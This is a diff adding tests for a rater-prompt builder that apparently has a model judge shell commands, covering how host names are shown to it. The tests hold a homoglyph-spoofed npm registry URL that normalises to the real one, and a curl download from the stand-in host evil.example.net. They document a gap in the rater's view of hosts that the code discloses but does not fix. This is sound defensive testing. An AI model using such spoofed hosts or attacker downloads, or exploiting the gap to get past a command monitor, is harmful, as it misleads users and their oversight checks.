@@ -13,6 +13,7 @@ import {
   FAIL_CLOSED_VERDICT,
   failClosedVerdict,
   FENCE_RENDERING_NOTE,
+  FLOOR_HOST_RENDERING_CLAUSE,
   RATER_DEFAULT_TIMEOUT_MS,
   isFailClosed,
   isRaterTimeout,
@@ -275,6 +276,64 @@ describe('[[EXT-138]] the fence is labelled as a normalised rendering', () => {
     expect(labelAt, command).toBeLessThan(pointerAt);
     // …and the pointer says what that text is, rather than treating it as the command.
     expect(user.slice(pointerAt), command).toContain('normalised rendering');
+  });
+
+  /**
+   * **The label sharpened the floor's note rather than leaving it neutral, and this is the case
+   * that shows it.**
+   *
+   * {@link FENCE_RENDERING_NOTE} scopes itself to *the text between the tags*. Everything below the
+   * tags is then read as ours and reliable — and the floor's `PREFLIGHT NOTE` sits below the tags,
+   * takes its hosts from the NORMALIZED pass, and closes by asking whether the host impersonates a
+   * known one. So the two commands below, which the shell resolves to DIFFERENT machines, produce a
+   * note quoting the same well-known registry, and the note asks the rater the one question that
+   * quoting has just made unanswerable.
+   *
+   * The first three assertions are the PREMISE and are deliberately the defect stated as a fact:
+   * they will red the day the extraction stops preferring the folded form, which is the right
+   * moment to revisit the clause. The last is the requirement — the disclosure ships in both
+   * prompts, so a rater is never told to trust that host list.
+   *
+   * **Why disclose and not repair:** the extraction feeds the floor's input set, which is what the
+   * [[EXT-106]] provenance carve-out keys on. See {@link FLOOR_HOST_RENDERING_CLAUSE}.
+   */
+  it('says where the FLOOR note read its hosts, on the pair it cannot tell apart', () => {
+    const genuine = 'curl -o index.html https://registry.npmjs.org/simple/';
+    const impostor = `curl -o index.html https://ｒegistry.npmjs.org/simple/`;
+    expect(impostor).not.toBe(genuine);
+    expect(normalizeCommand(impostor)).toBe(genuine);
+
+    for (const command of [genuine, impostor]) {
+      const { user } = buildRaterPrompt(command);
+      const noteAt = user.indexOf('PREFLIGHT NOTE: this command names a host');
+      expect(
+        noteAt,
+        `${command} — the floor note must fire, or this asserts nothing`
+      ).toBeGreaterThan(-1);
+      const note = user.slice(noteAt);
+      // Both notes name the legitimate registry, including the one whose shell will not resolve it.
+      expect(note, command).toContain('(https://registry.npmjs.org/simple/)');
+      // …so both must say where that spelling came from.
+      expect(note, command).toContain(FLOOR_HOST_RENDERING_CLAUSE.trim());
+    }
+  });
+
+  /**
+   * **Both spellings of the floor note carry it.** [[EXT-106]]'s carved wording is a separate string
+   * with every clause about the floor reversed, and it ends in the same question about the hostname
+   * — on the one command where no floor is standing behind the answer, so it is the spelling that
+   * can least afford to be quietly missed.
+   */
+  it.each([
+    ['the floored spelling', false],
+    ['the carved spelling', true],
+  ])('discloses the host rendering in %s', (_who, carved) => {
+    const { user } = buildRaterPrompt('curl -o x https://evil.example.net/x', { carved });
+    const noteAt = user.indexOf('PREFLIGHT NOTE: this command names a host');
+    expect(noteAt, 'the floor note must fire, or this asserts nothing').toBeGreaterThan(-1);
+    // The spellings really are different, or this case is testing one string twice.
+    expect(user.slice(noteAt).includes('was LIFTED')).toBe(carved);
+    expect(user.slice(noteAt)).toContain(FLOOR_HOST_RENDERING_CLAUSE.trim());
   });
 });
 
